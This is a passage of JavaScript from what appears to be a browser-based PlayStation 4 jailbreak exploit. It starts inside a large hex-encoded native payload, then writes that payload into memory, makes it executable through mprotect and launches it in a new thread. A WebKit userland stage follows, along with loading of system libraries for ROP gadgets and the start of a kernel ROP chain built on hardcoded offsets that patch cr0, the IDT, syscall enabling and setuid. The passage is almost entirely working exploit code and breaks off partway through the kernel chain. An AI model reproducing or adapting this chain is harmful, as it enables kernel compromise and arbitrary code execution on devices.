820e2c1,0X8d48d009,0X133fc088,0Xb0054801,0Xe9022ef3,0X0000018e,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X138fc088,0Xb0054801,0Xe9022f33,0X0000016e,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X13929888,0X00054801,0Xe9021bf9,0X0000014e,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X13d29888,0X00054801,0Xe9021c39,0X0000012e,0X000082b9,0X48320fc0,0X4820e2c1,0X8d48d009,0X13d33888,0Xb915eb01,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X0113e358,0X01600548,0Xf7e90230,0Xb9000000,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X0113e1d8,0X55900548,0Xd7e9022c,0Xb9000000,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X0113b568,0X62200548,0Xb7e901b4,0Xb9000000,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X0111a610,0Xc5700548,0X97e901b8,0Xb9000000,0Xc0000082,0Xc148320f,0X094820e2,0X888d48d0,0X0111a730,0X5f900548,0X7aeb01c6,0X48555441,0X0208ec81,0Xc0310000,0X247c8d48,0X007eb908,0Xabf30000,0X150d8d48,0X4800001a,0Xc748e589,0X00002404,0X8d480000,0X00111c15,0X0200be00,0X89480000,0X3111ffef,0X0259bfc9,0X89410000,0Xea8948c4,0X07bec031,0Xe8000000,0X00000fba,0Xf9058d48,0X8b000018,0X78ff8538,0Xe289440b,0Xe8ee8948,0X00000bc8,0X08c48148,0X83000002,0X415dffc8,0X8b48c35c,0X00011896,0X46c74800,0X00000004,0X1446c700,0X00000000,0X000002c7,0X8b480000,0X56894811,0X13be4830,0X00000000,0X48380100,0X8949008b,0X89492040,0X8b481840,0X00013087,0X40c74800,0Xffffff60,0X708948ff,0X40c74858,0Xffffff68,0Xc3c031ff,0Xdd3d8d48,0Xba000010,0X000001ff,0X000001be,0Xf9e85100,0X89000001,0X85c031c7,0Xe81678ff,0X000001f8,0Xb93d8d48,0Xe8000010,0X000001f8,0X000001b8,0X41c35a00,0X55544155,0Xec814853,0X000000d8,0X411d8d48,0X66000018,0X8566038b,0X5e850fc0,0X4c000001,0X1906258d,0X8d480000,0X482f246c,0X1c9a158d,0X8b4d0000,0X12ff242c,0X48ef8948,0X107b158d,0X89480000,0X0021bec1,0Xc0310000,0X31d5ff41,0X48f631d2,0X7de8ef89,0X85000001,0X79c589c0,0X31d2311e,0X3d8d48f6,0X0000106a,0X000167e8,0X89c08500,0X830879c5,0Xfee9ffc8,0X31000000,0X89f631d2,0X0226e8ef,0X8d480000,0Xba082474,0X00000020,0X25e8ef89,0X48000001,0X7520f883,0X74b70fd6,0Xd2312024,0Xff48ef89,0Xe6c148c6,0Xf5894905,0X0001f7e8,0X748d4800,0X40ba5024,0X89000000,0X00f6e8ef,0X83480000,0Xa77540f8,0X2484b70f,0X00000086,0X24b4b70f,0X00000088,0X0ff0af0f,0X842484b7,0X48000000,0X014cf663,0Xc60148ee,0X0fc6f640,0Xff480574,0X31f5ebc6,0Xe8ef89d2,0X000001a8,0X24b48d48,0X00000090,0X000040ba,0Xe8ef8900,0X000000a4,0X40f88348,0Xff51850f,0Xef89ffff,0X246c8d48,0X00b2e803,0X8b480000,0X00a8248c,0X44c70000,0X00000324,0X44c60000,0X48000724,0X0fa5158d,0X05be0000,0X48000000,0Xc031ef89,0X48c88949,0X4928e9c1,0X0f20e8c1,0X0f45c9b6,0Xff41c0b6,0X8d482414,0X00191f05,0Xef894800,0X896610ff,0Xc4814803,0X000000d8,0X5c415d5b,0X48c35d41,0X3118ec83,0Xfe32e8c0,0X8941ffff,0X45c031c0,0X1b75c085,0Xfffe5ae8,0X3d8d48ff,0Xfffff86c,0X24748d48,0X4489660e,0X9ae80e24,0X48000009,0Xc318c483,0X03c0c748,0Xe9000000,0X00000d3d,0X04c0c748,0Xe9000000,0X00000d31,0X05c0c748,0Xe9000000,0X00000d25,0X06c0c748,0Xe9000000,0X00000d19,0X0ac0c748,0Xe9000000,0X00000d0d,0X09c0c748,0Xe9000000,0X00000d01,0X3ac0c748,0Xe9000000,0X00000cf5,0X39c0c748,0Xe9000000,0X00000ce9,0X15c0c748,0Xe9000000,0X00000cdd,0X7ac0c748,0Xe9000001,0X00000cd1,0X16c0c748,0Xe9000000,0X00000cc5,0X7bc0c748,0Xe9000000,0X00000cb9,0X7cc0c748,0Xe9000000,0X00000cad,0X80c0c748,0Xe9000000,0X00000ca1,0X88c0c748,0Xe9000000,0X00000c95,0X89c0c748,0Xe9000000,0X00000c89,0Xbcc0c748,0Xe9000000,0X00000c7d,0Xbdc0c748,0Xe9000000,0X00000c71,0Xbec0c748,0Xe9000000,0X00000c65,0X10c0c748,0Xe9000001,0X00000c59,0Xdec0c748,0Xe9000001,0X00000c4d,0Xedc0c748,0Xe9000001,0X00000c41,0Xf631d231,0Xff06e851,0Xc789ffff,0Xff83c031,0Xe80a74ff,0Xffffff04,0X000001b8,0X51c35a00,0X5d058d48,0Xff000017,0Xc7894810,0X8548c031,0X480e74ff,0X17b2058d,0X10ff0000,0X000001b8,0X53c35a00,0X991d8d48,0X83000015,0X3375003b,0X35058d48,0X31000019,0X48f631d2,0X0dd43d8d,0X31450000,0Xc03145c9,0X10ffc931,0X29158d48,0X48000015,0X0de2358d,0Xc7890000,0Xafe80389,0X48000007,0X153a1d8d,0X3b830000,0X48347500,0X18f6058d,0Xd2310000,0X8d48f631,0X000de43d,0Xc9314500,0X31c03145,0X4810ffc9,0X1502158d,0X8d480000,0X000df835,0X5b038900,0X6fe9c789,0X5b000007,0X8d4853c3,0X0014df1d,0X003b8300,0X0088850f,0X8d480000,0X0018af05,0Xc9314500,0X31c03145,0X31d231c9,0X3d8d48f6,0X00000de2,0X8d4810ff,0X00149b15,0X358d4800,0X00000dfc,0X0389c789,0X000729e8,0X483b8b00,0X0e03358d,0X8d480000,0X00148b15,0X0714e800,0X3b8b0000,0X0b358d48,0X4800000e,0X149e158d,0Xffe80000,0X8b000006,0X358d483b,0X00000e17,0X79158d48,0Xe8000014,0X000006ea,0X8d483b8b,0X000e1c35,0X158d4800,0X0000147c,0X06d4e95b,0Xc35b0000,0X89495441,0Xff5be8fc,0X8d48ffff,0X00142305,0Xffff3100,0X74c08510,0Xcc834106,0X481eebff,0X1446058d,0X894c0000,0X8510ffe7,0Xc48941c0,0X8d48e775,0X00143b15,0Xffc03100,0Xe0894412,0X41c35c41,0X55544155,0X8348fd89,0X8d4820ec,0X00148705,0X0011bf00,0X10ff0000,0X49c08548,0X5b74c489,0Xfffefce8,0X058d48ff,0X000013c4,0X10ffff31,0X3875c085,0Xdd058d48,0X4c000013,0X0f246c8d,0X000011ba,0Xee894c00,0X10ffef89,0X1c75c085,0Xf1058d48,0X4c000013,0X894cee89,0X4810ffe7,0X13ca158d,0Xc0310000,0X0feb12ff,0Xe5058d48,0X4c000015,0X3145e789,0X4810ffe4,0X4c20c483,0X415de089,0Xc35d415c,0X74ff8548,0Xf685481d,0Xc0310e78,0X78c98548,0Xce394819,0X12eb2473,0X74ff8548,0Xf6854805,0X01b80679,0Xc3000000,0X3948c031,0X48f374f0,0X48070c8d,0X1188c0ff,0X3948f0eb,0X480b74c8,0X4807348d,0X1688c0ff,0Xc031f0eb,0X535441c3,0X1d8d4856,0X00001378,0X0f003b83,0X0005a085,0X058d4800,0X000016f8,0X45c93145,0Xc931c031,0Xf631d231,0Xde3d8d48,0Xff00000c,0X158d4810,0X0000138c,0Xe6358d48,0X8900000c,0Xe80389c7,0X00000572,0X8d483b8b,0X000cdb35,0X158d4800,0X0000152c,0X00055de8,0X483b8b00,0X0ccb358d,0X8d480000,0X00138f15,0X0548e800,0X3b8b0000,0Xbd358d48,0X4800000c,0X13f2158d,0X33e80000,0X8b000005,0X358d483b,0X00000cb0,0X8d158d48,0Xe8000014,0X0000051e,0X8d483b8b,0X000ca435,0X158d4800,0X00001438,0X000509e8,0X483b8b00,0X0c96358d,0X8d480000,0X0012eb15,0X04f4e800,0X3b8b0000,0X88358d48,0X4800000c,0X13b6158d,0Xdfe80000,0X8b000004,0X358d483b,0X00000c7a,0Xa9158d48,0Xe8000012,0X000004ca,0X8d483b8b,0X000c6d35,0X158d4800,0X000013a4,0X0004b5e8,0X483b8b00,0X0c62358d,0X8d480000,0X00125f15,0X04a0e800,0X3b8b0000,0X54358d48,0X4800000c,0X1342158d,0X8be80000,0X8b000004,0X358d483b,0X00000c47,0X65158d48,0Xe8000012,0X00000476,0X8d483b8b,0X000c3c35,0X158d4800,0X000012d8,0X000461e8,0X483b8b00,0X0c2e358d,0X8d480000,0X00133315,0X044ce800,0X3b8b0000,0X21358d48,0X4800000c,0X13e6158d,0X37e80000,0X8b000004,0X358d483b,0X00000c13,0X81158d48,0Xe8000013,0X00000422,0X8d483b8b,0X000c0535,0X158d4800,0X000012bc,0X00040de8,0X483b8b00,0X0bf8358d,0X8d480000,0X00136f15,0X03f8e800,0X3b8b0000,0Xeb358d48,0X4800000b,0X11ca158d,0Xe3e80000,0X8b000003,0X358d483b,0X00000bdf,0X05158d48,0Xe8000012,0X000003ce,0X8d483b8b,0X000bd535,0X158d4800,0X00001298,0X0003b9e8,0X483b8b00,0X0bc7358d,0X8d480000,0X0011d315,0X03a4e800,0X8d4c0000,0X00126725,0X358d4800,0X00000bb4,0X894c3b8b,0X038ce8e2,0X3b8b0000,0Xa8358d48,0X4800000b,0X132e158d,0X77e80000,0X8b000003,0X358d483b,0X00000b9a,0Xa1158d48,0Xe8000011,0X00000362,0X8d483b8b,0X000b8d35,0X158d4800,0X000011dc,0X00034de8,0X483b8b00,0X0b7f358d,0X8d480000,0X00123f15,0X0338e800,0X3b8b0000,0X48e2894c,0X0b4a358d,0X27e80000,0X8b000003,0X358d483b,0X00000b61,0X21158d48,0Xe8000012,0X00000312,0X8d483b8b,0X000b4b35,0X158d4800,0X0000114c,0X0002fde8,0X483b8b00,0X0b3d358d,0X8d480000,0X00127715,0X02e8e800,0X3b8b0000,0X30358d48,0X4800000b,0X1272158d,0Xd3e80000,0X8b000002,0X358d483b,0X00000b20,0X15158d48,0Xe8000011,0X000002be,0X8d483b8b,0X000b1035,0X158d4800,0X00001150,0X0002a9e8,0X483b8b00,0X0b03358d,0X8d480000,0X00106b15,0X0294e800,0X3b8b0000,0Xf7358d48,0X4800000a,0X10de158d,0X7fe80000,0X8b000002,0X358d483b,0X00000aed,0X69158d48,0Xe8000011,0X0000026a,0X8d483b8b,0X000adf35,0X158d4800,0X0000111c,0X000255e8,0X483b8b00,0X0ad0358d,0X8d480000,0X00117f15,0X0240e800,0X3b8b0000,0Xbc358d48,0X4800000a,0X10c2158d,0X2be80000,0X8b000002,0X358d483b,0X00000aac,0Xdd158d48,0Xe800000f,0X00000216,0X8d483b8b,0X000a9f35,0X158d4800,0X00001120,0X000201e8,0X483b8b00,0X0a84358d,0X8d480000,0X00105b15,0X01ece800,0X3b8b0000,0X77358d48,0X4800000a,0X1156158d,0Xd7e80000,0X8b000001,0X358d483b,0X00000a5b,0X11158d48,0Xe8000011,0X000001c2,0X8d483b8b,0X000a5535,0X158d4800,0X00001154,0X0001ade8,0X483b8b00,0X0a47358d,0X8d480000,0X0010ff15,0X0198e800,0X3b8b0000,0X3b358d48,0X4800000a,0X10aa158d,0X83e80000,0X8b000001,0X358d483b,0X00000a30,0Xf5158d48,0Xe8000010,0X0000016e,0X8d483b8b,0X000a2735,0X158d4800,0X00000fe0,0X000159e8,0X483b8b00,0X0a19358d,0X8d480000,0X00109b15,0X0144e800,0X3b8b0000,0X0c358d48,0X4800000a,0X0f56158d,0X2fe80000,0X8b000001,0X358d483b,0X000009ff,0X31158d48,0Xe800000f,0X0000011a,0X8d483b8b,0X0009f435,0X158d4800,0X000010cc,0X000105e8,0X483b8b00,0X09e7358d,0X8d480000,0X000eef15,0X00f0e800,0X3b8b0000,0Xda358d48,0X48000009,0X0ee2158d,0Xdbe80000,0X8b000000,0X358d483b,0X000009cf,0X85158d48,0Xe8000010,0X000000c6,0X8d483b8b,0X0009c335,0X158d4800,0X00000f50,0X0000b1e8,0X483b8b00,0X09b4358d,0X8d480000,0X000ebb15,0X009ce800,0X3b8b0000,0Xab358d48,0X48000009,0X0f9e158d,0X87e80000,0X8b000000,0X358d483b,0X0000099c,0X69158d48,0Xe800000f,0X00000072,0X8d483b8b,0X00098d35,0X158d4800,0X00000ff4,0X00005de8,0X483b8b00,0X097f358d,0X8d480000,0X000ec715,0X0048e800,0X3b8b0000,0X70358d48,0X48000009,0X0f6a158d,0X33e80000,0X8b000000,0X358d483b,0X00000961,0X65158d48,0Xe800000f,0X0000001e,0X8d483b8b,0X00095335,0X158d4800,0X00000e70,0X5c415b59,0X000005e9,0X415b5800,0Xc748c35c,0X00024fc0,0X0403e900,0Xc7480000,0X000250c0,0X03f7e900,0X89480000,0X48d231f1,0X3145fe89,0X52bf50c0,0X31000002,0X03dce8c0,0Xc35a0000,0Xe1058d48,0X4800000f,0Xc931d263,0Xff008b48,0Xc0c748e0,0X00000025,0X0003c0e9,0Xc0c74800,0X00000036,0X0003b4e9,0Xc0c74800,0X0000000b,0X0003a8e9,0X53544100,0X1d8d4856,0X00001040,0X0f003b83,0X00038c85,0X258d4c00,0X000010b0,0X48de8948,0X08ba3d8d,0Xc7490000,0X00002404,0X7fe80000,0X85ffffff,0X482274c0,0X8d48de89,0X0008ae3d,0Xff6ce800,0Xc085ffff,0X89480f74,0X3d8d48de,0X000008ae,0Xffff59e8,0X483b8bff,0X08b3358d,0X8d480000,0X000feb15,0Xff2ce800,0X3b8bffff,0Xb0358d48,0X48000008,0X1016158d,0X17e80000,0X8bffffff,0Xe2894c3b,0Xa9358d48,0Xe8000008,0Xffffff06,0X8d483b8b,0X0008a335,0X158d4800,0X00001008,0Xfffef1e8,0X483b8bff,0X089d358d,0X8d480000,0X00103b15,0Xfedce800,0X3b8bffff,0Xa1358d48,0X48000008,0X1056158d,0Xc7e80000,0X8bfffffe,0X358d483b,0X000008aa,0Xb9158d48,0Xe800000f,0Xfffffeb2,0X8d483b8b,0X0008ae35,0X158d4800,0X00000f64,0Xfffe9de8,0X483b8bff,0X08b6358d,0X8d480000,0X000fdf15,0Xfe88e800,0X3b8bffff,0Xaf358d48,0X48000008,0X1032158d,0X73e80000,0X8bfffffe,0X358d483b,0X000008a8,0X85158d48,0Xe800000f,0Xfffffe5e,0X8d483b8b,0X0008a135,0X158d4800,0X00000f98,0Xfffe49e8,0X483b8bff,0X089b358d,0X8d480000,0X000fa315,0Xfe34e800,0X3b8bffff,0X95358d48,0X48000008,0X0efe158d,0X1fe80000,0X8bfffffe,0X358d483b,0X0000088f,0Xa9158d48,0Xe800000f,0Xfffffe0a,0X8d483b8b,0X00088a35,0X158d4800,0X00000e9c,0Xfffdf5e8,0X483b8bff,0X088b358d,0X8d480000,0X000f5f15,0Xfde0e800,0X3b8bffff,0X8e358d48,0X48000008,0X0eb2158d,0Xcbe80000,0X8bfffffd,0X358d483b,0X00000890,0Xd5158d48,0Xe800000e,0Xfffffdb6,0X8d483b8b,0X00088235,0X158d4800,0X00000f88,0Xfffda1e8,0X483b8bff,0X087a358d,0X8d480000,0X000e9b15,0Xfd8ce800,0X3b8bffff,0X6d358d48,0X48000008,0X0e46158d,0X77e80000,0X8bfffffd,0X358d483b,0X0000085f,0X11158d48,0Xe800000f,0Xfffffd62,0X8d483b8b,0X00085735,0X158d4800,0X00000ec4,0Xfffd4de8,0X483b8bff,0X0859358d,0X8d480000,0X000eef15,0Xfd38e800,0X3b8bffff,0X5a358d48,0X48000008,0X0e12158d,0X23e80000,0X8bfffffd,0X358d483b,0X0000085b,0Xb5158d48,0Xe800000e,0Xfffffd0e,0X8d483b8b,0X00085c35,0X158d4800,0X00000ed8,0Xfffcf9e8,0X483b8bff,0X085d358d,0X8d480000,0X000ddb15,0Xfce4e800,0X3b8bffff,0X4f358d48,0X48000008,0X0d7e158d,0Xcfe80000,0X8bfffffc,0X358d483b,0X00000841,0X91158d48,0Xe800000d,0Xfffffcba,0X8d483b8b,0X00083335,0X158d4800,0X00000e74,0Xfffca5e8,0X483b8bff,0X0825358d,0X8d480000,0X000dd715,0Xfc90e800,0X3b8bffff,0X17358d48,0X48000008,0X0e02158d,0X7be80000,0X8bfffffc,0X358d483b,0X0000080b,0X95158d48,0Xe800000d,0Xfffffc66,0X8d483b8b,0X0007ff35,0X158d4800,0X00000e18,0Xfffc51e8,0X483b8bff,0X07fb358d,0X8d480000,0X000dd315,0Xfc3ce800,0X3b8bffff,0X04358d48,0X48000008,0X0d66158d,0X27e80000,0X8bfffffc,0X358d483b,0X00000810,0Xe9158d48,0Xe800000d,0Xfffffc12,0X8d483b8b,0X00081b35,0X158d4800,0X00000d64,0X5c415b59,0Xfffbf9e9,0X415b58ff,0X3148c35c,0Xca8949c0,0X0172050f,0X3d8348c3,0X00000d13,0X50187400,0X0d0a15ff,0X89590000,0Xc0c74808,0Xffffffff,0Xffc2c748,0Xc3ffffff,0X6e6e7552,0X20676e69,0X74736948,0X2079726f,0X636f6c42,0X0072656b,0X544f4e5b,0X43494649,0X4f495441,0X203a5d4e,0X000a7325,0X6573752f,0X6f682f72,0X252f656d,0X65772f78,0X6f726262,0X72657377,0X646e652f,0X74736968,0X2e79726f,0X00747874,0X74736948,0X2079726f,0X636f6c62,0X2072656b,0X62616e65,0X2064656c,0X3a726f66,0X0a732520,0X6e75520a,0X79617020,0X64616f6c,0X61676120,0X74206e69,0X6964206f,0X6c626173,0X69480065,0X726f7473,0X6c622079,0X656b636f,0X69642072,0X6c626173,0X66206465,0X203a726f,0X0a0a7325,0X206e7552,0X6c796170,0X2064616f,0X69616761,0X6f74206e,0X616e6520,0X00656c62,0X62616e55,0X7420656c,0X6567206f,0X73752074,0X49207265,0X696c2044,0X63007473,0X3a6c6d78,0X73702f2f,0X69746f6e,0X61636966,0X6e6f6974,0X7865742f,0X6f63695f,0X79735f6e,0X6d657473,0X736e5500,0X6f707075,0X64657472,0X72696620,0X7261776d,0X00000065,0Xffffed0d,0Xffffed0d,0Xffffed0d,0Xffffed0d,0Xffffec3d,0Xffffec3d,0Xffffee8c,0Xffffee8c,0Xffffee8c,0Xffffec5d,0Xffffec7d,0Xffffec9d,0Xffffecf8,0Xffffecf8,0Xffffee6c,0Xffffed18,0Xffffee6c,0Xffffed18,0Xffffee6c,0Xffffed18,0X6573752f,0X6a2e2f72,0X626c6961,0X6b616572,0X73252f00,0X6d6f632f,0X2f6e6f6d,0X2f62696c,0X6362696c,0X7270732e,0X732f0078,0X65747379,0X6f632f6d,0X6e6f6d6d,0X62696c2f,0X62696c2f,0X70732e63,0X25007872,0X786c3230,0X6c323025,0X732f0078,0X65747379,0X6f632f6d,0X6e6f6d6d,0X62696c2f,0X62696c2f,0X53656353,0X74557379,0X732e6c69,0X00787270,0X53656373,0X74557379,0X65536c69,0X7953646e,0X6d657473,0X69746f4e,0X61636966,0X6e6f6974,0X68746957,0X74786554,0X79732f00,0X6d657473,0X6d6f632f,0X2f6e6f6d,0X2f62696c,0X5362696c,0X79536563,0X6d657473,0X76726553,0X2e656369,0X78727073,0X65637300,0X74737953,0X65536d65,0X63697672,0X75614c65,0X5768636e,0X72426265,0X6573776f,0X732f0072,0X65747379,0X6f632f6d,0X6e6f6d6d,0X62696c2f,0X62696c2f,0X55656353,0X53726573,0X69767265,0X732e6563,0X00787270,0X55656373,0X53726573,0X69767265,0X6e496563,0X61697469,0X657a696c,0X65637300,0X72657355,0X76726553,0X47656369,0X6e497465,0X61697469,0X6573556c,0X63730072,0X65735565,0X72655372,0X65636976,0X4c746547,0X6e69676f,0X72657355,0X694c6449,0X73007473,0X73556563,0X65537265,0X63697672,0X74654765,0X72657355,0X656d614e,0X65637300,0X72657355,0X76726553,0X54656369,0X696d7265,0X6574616e,0X62696c00,0X4c656353,0X49636269,0X7265746e,0X2e6c616e,0X78727073,0X6c616d00,0X00636f6c,0X65657266,0X6c616300,0X00636f6c,0X6c616572,0X00636f6c,0X616d656d,0X6e67696c,0X6d656d00,0X00746573,0X636d656d,0X6d007970,0X6d636d65,0X656d0070,0X766f6d6d,0X656d0065,0X766f6d6d,0X00735f65,0X63727473,0X73007970,0X636e7274,0X73007970,0X636e7274,0X735f7970,0X72747300,0X00746163,0X6e727473,0X00746163,0X6c727473,0X73006e65,0X6d637274,0X74730070,0X6d636e72,0X70730070,0X746e6972,0X6e730066,0X6e697270,0X73006674,0X6972706e,0X5f66746e,0X73730073,0X666e6163,0X72747300,0X006c6f74,0X74727473,0X73006b6f,0X68637274,0X74730072,0X68637272,0X74730072,0X72747372,0X72747300,0X00707564,0X646e6972,0X69007865,0X67696473,0X61007469,0X00696f74,0X666f7461,0X72747300,0X7970636c,0X72747300,0X6f727265,0X475f0072,0X63707465,0X65707974,0X74535f00,0X006c756f,0X706f6362,0X72730079,0X00646e61,0X74637361,0X00656d69,0X74637361,0X5f656d69,0X6d670072,0X656d6974,0X746d6700,0X5f656d69,0X6f6c0073,0X746c6163,0X00656d69,0X61636f6c,0X6d69746c,0X00725f65,0X69746b6d,0X6f00656d,0X646e6570,0X72007269,0X64646165,0X72007269,0X64646165,0X725f7269,0X6c657400,0X7269646c,0X65657300,0X7269646b,0X77657200,0X64646e69,0X63007269,0X65736f6c,0X00726964,0X66726964,0X65670064,0X6f727074,0X6d616e67,0X6f660065,0X006e6570,0X61657266,0X77660064,0X65746972,0X65736600,0X66006b65,0X6c6c6574,0X6c636600,0X0065736f,0X69727066,0X0066746e,0X6b62696c,0X656e7265,0X70732e6c,0X6c007872,0X656b6269,0X6c656e72,0X6265775f,0X7270732e,0X696c0078,0X72656b62,0X5f6c656e,0X2e737973,0X78727073,0X735f5f00,0X6b636174,0X6b68635f,0X6175675f,0X5f006472,0X6174735f,0X635f6b63,0X665f6b68,0X006c6961,0X72655f5f,0X00726f72,0X4b656373,0X656e7265,0X7272456c,0X7300726f,0X654b6563,0X6c656e72,0X64616f4c,0X72617453,0X646f4d74,0X00656c75,0X4b656373,0X656e7265,0X6c6c416c,0X7461636f,0X72694465,0X4d746365,0X726f6d65,0X63730079,0X72654b65,0X4d6c656e,0X69447061,0X74636572,0X6f6d654d,0X73007972,0X654b6563,0X6c656e72,0X44746547,0X63657269,0X6d654d74,0X5379726f,0X00657a69,0X4b656373,0X656e7265,0X6174536c,0X63730074,0X72654b65,0X4f6c656e,0X006e6570,0X4b656373,0X656e7265,0X6165526c,0X63730064,0X72654b65,0X4c6c656e,0X6b656573,0X65637300,0X6e72654b,0X6c436c65,0X0065736f,0X4b656373,0X656e7265,0X656c536c,0X73007065,0X654b6563,0X6c656e72,0X656c7355,0X73007065,0X654b6563,0X6c656e72,0X74746547,0X6f656d69,0X79616466,0X65637300,0X6e72654b,0X65476c65,0X6f725074,0X73736563,0X656d6954,0X65637300,0X6e72654b,0X65476c65,0X72754374,0X746e6572,0X00757043,0X63737973,0X73006c74,0X74637379,0X6e79626c,0X00656d61,0X61737973,0X00686372,0X63657865,0X70006576,0X65726874,0X735f6461,0X00666c65,0X72687470,0X5f646165,0X61746573,0X6e696666,0X5f797469,0X7300706e,0X654b6563,0X6c656e72,0X61657243,0X71456574,0X65756575,0X65637300,0X6e72654b,0X65446c65,0X6574656c,0X65757145,0X73006575,0X654b6563,0X6c656e72,0X55646441,0X45726573,0X746e6576,0X65637300,0X6e72654b,0X64416c65,0X61655264,0X65764564,0X6700746e,0X69757465,0X65670064,0X64696774,0X74656700,0X00646970,0X75746573,0X73006469,0X69677465,0X65730064,0X75657274,0X73006469,0X65727465,0X00646967,0X4b656373,0X656e7265,0X7465476c,0X73506449,0X65637300,0X6e72654b,0X65476c65,0X65704f74,0X4973506e,0X726f4664,0X74737953,0X73006d65,0X654b6563,0X6c656e72,0X646e6553,0X69746f4e,0X61636966,0X6e6f6974,0X75716552,0X00747365,0X4b656373,0X656e7265,0X7465476c,0X61537346,0X6f62646e,0X6e615278,0X576d6f64,0X0064726f,0X4b656373,0X656e7265,0X7465476c,0X74737953,0X77536d65,0X73726556,0X006e6f69,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000001,0X00000001,0X00000001,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X6ffffef5,0X00000000,0X000022a8,0X00000000,0X00000005,0X00000000,0X000022a0,0X00000000,0X00000006,0X00000000,0X00002288,0X00000000,0X0000000a,0X00000000,0X00000001,0X00000000,0X0000000b,0X00000000,0X00000018,0X00000000,0X00000015,0X00000000,0X00000000,0X00000000,0X0000001e,0X00000000,0X00000008,0X00000000,0X6ffffffb,0X00000000,0X08000001,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0X00000000,0Xffffffff,0];
    var payload_loader = p.malloc32(9132);
    var loader_writer = payload_loader.backing;
    for(var i=0; i < (payload.length - 1); i++)
    {
	    loader_writer[i] = payload[i];
    }
    chain.syscall(74, payload_loader, 9132, (0x1 | 0x2 | 0x4));
    var pthread = p.malloc(0x10);
    chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
    ghdone();
}



function run_hax() {
    userland();
    if (chain.syscall(23, 0).low != 0x0) {
       kernel();
	   //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
    }
	else { // load payload mod / html payloads - stooged
	injectPayload();
	}
}


function kernel() {
    extra_gadgets();
    kchain_setup();
    object_setup();
    trigger_spray();
}

var handle;
var random_path;
var ex_info;

function load_prx(name) {
    //sys_dynlib_load_prx
    var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
    if (res.low != 0x0) {
        alert("failed to load prx/get handle " + name);
    }
    //sys_dynlib_get_info_ex
    p.write8(ex_info, 0x1A8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) {
        alert("failed to get module info from handle");
    }
    var tlsinit = p.read8(ex_info.add32(0x110));
    var tlssize = p.read4(ex_info.add32(0x11C));

    if (tlssize != 0) {
        if (name == "libSceWebKit2.sprx") {
            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
        } else {
            alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
        }
    }
    return tlsinit;
}

function extra_gadgets() {
    handle = p.malloc(0x150);
    var randomized_path_ptr = handle.add32(0x4);
    ex_info = randomized_path_ptr.add32(0x30);

    chain.syscall(602, 0, randomized_path_ptr);
    random_path = p.readstr(randomized_path_ptr);

    var ipmi_addr = load_prx("libSceIpmi.sprx");
    var hmd_addr = load_prx("libSceHmd.sprx");
    var wk2_addr = load_prx("libSceWebKit2.sprx");

    for (var gadget in hmd_gadgetmap) {
        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (var gadget in wk2_gadgetmap) {
        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (var gadget in ipmi_gadgetmap) {
        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }

    for (var gadget in window.gadgets) {
        p.read8(window.gadgets[gadget]);
    }
}

function kchain_setup() {
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1FB949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4B5;
    const KERNEL_enable_syscalls_3 = 0x4B9;
    const KERNEL_enable_syscalls_4 = 0x4C2;
    const KERNEL_mprotect = 0x80B8D;
    const KERNEL_prx = 0x23AEC4;
    const KERNEL_dlsym_1 = 0x23B67F;
    const KERNEL_dlsym_2 = 0x221b40;


    const KERNEL_setuid = 0x1A06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054C;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap = 0x16632A;
    const KERNEL_setcr0_patch = 0x3ade3B;
    const KERNEL_kqueue_close_epi = 0x398991;

    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    //negative offset of kqueue string to kernel base
    //0xFFFFFFFFFF86B593 0x505
    //0xFFFFFFFFFF80E364 0x900
    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));

    kchain = new rop();
    kchain2 = new rop();

    kchain.count = 0;
    kchain2.count = 0;

    kchain.set_kernel_var(KERNEL_BASE_PTR);
    kchain2.set_kernel_var(KERNEL_BASE_PTR);

    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);



    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    //Modify UD
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6);
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xE);
